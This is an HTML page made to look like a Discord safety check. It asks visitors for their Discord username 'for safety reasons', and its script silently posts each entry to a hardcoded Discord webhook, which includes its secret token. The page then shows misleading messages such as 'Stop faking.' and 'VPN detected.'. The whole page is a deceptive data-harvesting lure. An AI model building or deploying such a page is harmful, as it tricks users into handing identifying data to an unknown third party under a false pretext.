<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }

    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Please enter your Discord username for safety reasons:</p>
    <input type="text" id="discordUser" placeholder="Discord Username" required>
    <button onclick="validateDiscordUser()">Submit</button>
    <p id="status"></p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    // Validate Discord username
    async function validateDiscordUser() {
      const discordUser = document.getElementById('discordUser').value.trim();
      const status = document.getElementById('status');

      if (discordUser.length < 6) {
        status.textContent = 'Stop faking.';
        status.style.color = 'red';
        setTimeout(() => {
          status.textContent = 'VPN detected.';
          status.style.color = 'orange';
        }, 2000);
        return;
      }

      // Send valid Discord username to the webhook
      await sendToWebhook(discordUser);

      // Update UI
      status.textContent = 'Thank you for submitting your Discord username.';
      status.style.color = 'green';

      setTimeout(() => {
        status.textContent = 'VPN detected.';
        status.style.color = 'orange';
      }, 2000);
    }

    // Send data to webhook
    async function sendToWebhook(discordUser) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `**Discord Username Submitted:** ${discordUser}` }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }
  </script>
</body>
</html>
